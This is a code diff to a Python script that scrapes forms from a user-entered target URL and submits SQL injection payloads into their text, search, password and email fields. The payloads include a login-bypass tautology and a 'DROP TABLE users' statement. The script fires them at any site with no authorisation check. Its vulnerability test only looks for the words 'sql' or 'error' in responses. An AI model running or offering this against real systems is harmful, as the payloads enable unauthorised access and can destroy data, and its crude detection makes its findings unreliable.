@@ -6,7 +6,7 @@ def find_forms(url):
     soup = BeautifulSoup(response.text, 'html.parser')
     return soup.find_all('form')
 
-def submit_form(form, url, value):
+def submit_form(form, url, payload):
     action = form.get('action')
     post_url = url + action
     method = form.get('method')
@@ -14,8 +14,8 @@ def submit_form(form, url, value):
     data = {}
 
     for input in inputs:
-        if input.get('type') == 'text' or input.get('type') == 'search':
-            data[input.get('name')] = value
+        if input.get('type') in ['text', 'search', 'password', 'email']:
+            data[input.get('name')] = payload
         else:
             data[input.get('name')] = input.get('value')
 
@@ -24,22 +24,19 @@ def submit_form(form, url, value):
     else:
         return requests.get(post_url, params=data)
 
-def sqli_test(url):
+def sqli_scan(url):
     forms = find_forms(url)
-    print(f"[+] Detected {len(forms)} forms on {url}.")
+    sql_payloads = ["' OR '1'='1", "' OR '1'='1' -- ", "'; DROP TABLE users; --"]
     for form in forms:
-        is_vulnerable = False
-        for c in "\"'":
-            response = submit_form(form, url, c)
-            if "error" not in response.text.lower():
-                is_vulnerable = True
-                print(f"[!] SQL Injection vulnerability detected on {url}")
-                print(f"[*] Form details:")
-                print(form)
+        for payload in sql_payloads:
+            response = submit_form(form, url, payload)
+            if "sql" in response.text.lower() or "error" in response.text.lower():
+                print(f"[!] SQL Injection vulnerability detected with payload: {payload}")
+                print(f"[*] Form details: {form}")
                 break
-        if not is_vulnerable:
-            print(f"[-] No SQL Injection vulnerability detected on {url}")
+        else:
+            print("[-] No SQL Injection vulnerability found.")
 
 if __name__ == "__main__":
-    target_url = input("Enter the target URL: ")
-    sqli_test(target_url)
+    target_url = input("Enter the target URL (e.g., http://example.com): ")
+    sqli_scan(target_url)
